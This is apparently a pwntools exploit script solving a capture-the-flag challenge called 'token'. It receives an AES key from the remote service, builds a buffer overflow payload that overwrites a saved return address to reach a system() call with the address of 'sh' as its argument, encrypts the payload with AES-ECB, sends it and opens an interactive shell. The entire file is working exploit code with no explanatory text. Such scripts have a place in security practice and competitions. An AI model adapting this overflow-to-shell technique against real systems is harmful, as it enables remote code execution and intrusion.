from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

elf = ELF("./token")

if args.REMOTE:
	p = remote("token.chal.cyberjousting.com", 1354)
else:
	p = remote("127.0.0.1", 40002)
	pause()

key = p.recv(16)
assert len(key) == 16
def encrypt(data):
	aes = AES.new(key, AES.MODE_ECB)
	enc = aes.encrypt(data)
	return enc

fp = b"FFFF"
sh_addr = 0x4140d0 + 2
ra = 0x401054
payload = b"t=" + b"A" * 0x20 + p32(sh_addr - 0xb).rstrip(b"\0")	# write the address of 'sh' into what will be loaded into a0
payload += b"&t=" + b"A" * 0x14 + fp + p32(ra)	# write the address of a call to system() in $ra register
while (len(payload) & 0xf) != 0:	# pad the payload to be encrypted by AES
	payload += b"\0"

wrapped_payload = b"LEsh\0AAGO".ljust(0xf, b"B") + encrypt(payload)
p.send(wrapped_payload)

p.interactive()
